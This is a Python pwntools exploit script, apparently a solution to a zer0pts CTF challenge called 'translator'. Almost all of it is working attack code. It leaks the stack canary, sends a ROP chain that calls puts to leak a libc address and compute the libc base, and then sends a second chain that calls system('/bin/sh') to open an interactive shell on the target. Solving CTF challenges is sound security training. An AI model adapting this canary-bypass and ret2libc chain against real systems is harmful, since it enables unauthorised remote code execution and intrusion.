from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "pwn.ctf.zer0pts.com"
    port = 9002
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r='>'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

server = process('translator')


rs('/bin/sh')
rs('15')

rs('+', r=':')
recvuntil('close to ')
v = recvuntil(' ')
print(v)
server.sendline(v)
l = server.recvline()
canary = int(l, 16)
sendline('\n')

print(hex(canary))
recvuntil('(Y/n) ')

pop_rdi = 0x00400e93
pop_rsi_r15 = 0x00400e91

puts_plt = 0x4006d0
leak = 0x601ff0

name_buf = 0x6020a0
ask_again = 0x40089b
ret = 0x40089a

if is_gaibu:
    libc_start_main_offset = 0x21b10
    system_offset = 0x4f550
    binsh_offset = 0x1b3e1a
else:
    libc_start_main_offset = 0x26fc0
    system_offset = 0x55410
    binsh_offset = 0x1b75aa

payload = [
        pop_rdi, # pad

        pop_rdi,
        leak,
        puts_plt,

        ask_again,
        ]

pad = 'A' * 0x18 + p64(canary)

payload = ''.join(map(p64, payload))

'''
b * 0x400915
'''
wait_for_attach()
sendline(pad + payload)

libc_base = just_u64(recvline()) - libc_start_main_offset
print(hex(libc_base))

recvuntil('(Y/n) ')

binsh = libc_base + binsh_offset
system = libc_base + system_offset

payload = [
        pop_rdi, # pad
        ret,

        pop_rdi,
        binsh,

        system,
        ]


payload = ''.join(map(p64, payload))
wait_for_attach()
sendline(pad + payload)

interactive()

